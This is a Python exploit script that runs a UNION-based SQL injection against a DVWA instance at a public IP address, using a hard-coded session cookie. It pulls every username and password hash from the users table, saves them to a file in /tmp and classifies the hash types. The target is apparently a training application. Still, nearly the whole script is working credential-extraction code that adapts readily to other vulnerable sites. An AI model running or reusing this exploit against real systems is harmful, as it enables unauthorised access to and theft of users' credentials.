
import requests
import re
import html

# Create session and set cookies
session = requests.Session()
session.cookies.set('PHPSESSID', 'u1sbabk40idi42696eoie42qk7')
session.cookies.set('security', 'low')

url_base = "http://31.97.117.123"
sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] FINAL EXTRACTION: All user data with password hashes from DVWA\n")

# Payload to extract all users with their usernames and password hashes
payload = "999' UNION SELECT user, password FROM users -- -"

print(f"[*] SQL Injection Payload: {payload}\n")

try:
    response = session.get(sqli_url, params={'id': payload, 'Submit': 'Submit'}, timeout=10)
    
    # Find all <pre> blocks which contain the results
    pre_blocks = re.findall(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    
    users_found = []
    
    for block in pre_blocks:
        # Decode HTML entities and parse the block
        block_decoded = html.unescape(block)
        
        # Extract ID, username (First name), and password hash (Surname)
        id_match = re.search(r'ID:\s*([^\n<]+)', block_decoded)
        username_match = re.search(r'First name:\s*([^\n<]+)', block_decoded)
        hash_match = re.search(r'Surname:\s*([^\n<]+)', block_decoded)
        
        if id_match and username_match and hash_match:
            id_val = id_match.group(1).strip()
            username = username_match.group(1).strip()
            password_hash = hash_match.group(1).strip()
            
            # Skip if this is the injected query itself
            if not "UNION" in id_val and not "SELECT" in id_val:
                users_found.append((id_val, username, password_hash))
    
    if users_found:
        print("[+] ===== SUCCESSFULLY EXTRACTED USER DATA =====\n")
        print("=" * 110)
        print(f"{'ID':<5} | {'USERNAME':<20} | {'PASSWORD HASH (MD5)':<60}")
        print("=" * 110)
        for id_val, username, password_hash in users_found:
            print(f"{id_val:<5} | {username:<20} | {password_hash:<60}")
        print("=" * 110)
        
        # Save to file in multiple formats
        with open('/tmp/extracted_users.txt', 'w') as f:
            f.write("="*110 + "\n")
            f.write("EXTRACTED USER DATA FROM DVWA - SQL INJECTION VULNERABILITY\n")
            f.write("="*110 + "\n\n")
            
            f.write(f"{'ID':<5} | {'USERNAME':<20} | {'PASSWORD HASH (MD5)':<60}\n")
            f.write("-"*110 + "\n")
            for id_val, username, password_hash in users_found:
                f.write(f"{id_val:<5} | {username:<20} | {password_hash:<60}\n")
            f.write("="*110 + "\n\n")
            
            f.write("DETAILED USER INFORMATION:\n")
            f.write("-"*110 + "\n")
            for idx, (id_val, username, password_hash) in enumerate(users_found, 1):
                f.write(f"\n[{idx}] User Information:\n")
                f.write(f"    User ID: {id_val}\n")
                f.write(f"    Username: {username}\n")
                f.write(f"    Password Hash: {password_hash}\n")
                f.write(f"    Hash Type: MD5 (32 characters)\n")
            
            f.write("\n" + "="*110 + "\n")
            f.write("SUMMARY:\n")
            f.write(f"Total users extracted: {len(users_found)}\n")
            f.write("Extraction method: SQL Injection (UNION SELECT)\n")
            f.write("Database table: users\n")
            f.write("="*110 + "\n")
        
        print(f"\n[+] Total users extracted: {len(users_found)}")
        print(f"[+] Data saved to /tmp/extracted_users.txt")
        
        # Analyze hashes
        print("\n[*] Hash Analysis:")
        print("-" * 50)
        for id_val, username, password_hash in users_found:
            hash_len = len(password_hash)
            if hash_len == 32:
                hash_type = "MD5"
            elif hash_len == 40:
                hash_type = "SHA1"
            elif hash_len == 64:
                hash_type = "SHA256"
            else:
                hash_type = f"Unknown ({hash_len} chars)"
            print(f"  {username:<20} -> {hash_type}")
        
    else:
        print("[-] No user data could be extracted")
    
except Exception as e:
    print(f"[-] Error during extraction: {e}")
    import traceback
    traceback.print_exc()

